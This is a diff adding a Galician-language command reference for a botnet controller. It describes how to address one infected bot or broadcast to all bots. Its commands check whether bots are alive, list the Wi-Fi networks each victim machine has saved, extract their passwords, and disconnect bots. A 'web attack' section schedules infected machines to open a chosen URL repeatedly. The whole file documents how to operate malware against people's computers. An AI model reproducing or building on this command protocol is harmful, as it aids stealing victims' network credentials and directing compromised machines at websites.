@@ -1,0 +1,25 @@
+***Cadea inicial para a selección de Bots concretos ou de todos (Broadcast):
+
+Seleccionando no desplegable o Bot concreto, escribindo o programa automaticamente "1234BotX:", ou indicando que se fará unha orde global, 
+que é un broadcast, escribindo automaticamente "1234Broadcast:"
+
+***Comentarios
+
+"1234BotX--Comment:" + "Comentario"
+"1234Broadcast--Comment:" + "Comentario"
+
+***Ordes que lles podes dar os Bots
+
+"Hellow"----------------------> Comproba si un Bot segue activo, este devolve un "Hellow" no BotMaster. Non se escribe nada no ficheiro
+"Obter Wifis"-----------------> Escribe no ficheiro todas as redes Wi-Fi ás que se conectou o ordenador infectado no pasado
+"Obter contrasinal de X"------> Devolve o contrasinal para conectarse á rede Wi-Fi "X"
+"nbots"-----------------------> Obtén o número de Bots que hai no sistema, no caso de haber algún
+"kill"------------------------> Desconecta o Bot da Botnet
+
+***Ataque WEB
+				       Formatos aceptados:
+
+"www.google.es"------------------------------------> Abrirá a ventá unha vez instantaneamente
+"www.google.es**1"---------------------------------> Abrirá a ventá X veces instantaneamente
+"www.google.es**1**DD/MM/AAAA hh:mm:ss"------------> Abrirá a ventá X veces na data indicada, a excepción de indicar unha data que
+						     que xa pasou, ou cun formato diferente ao indicado
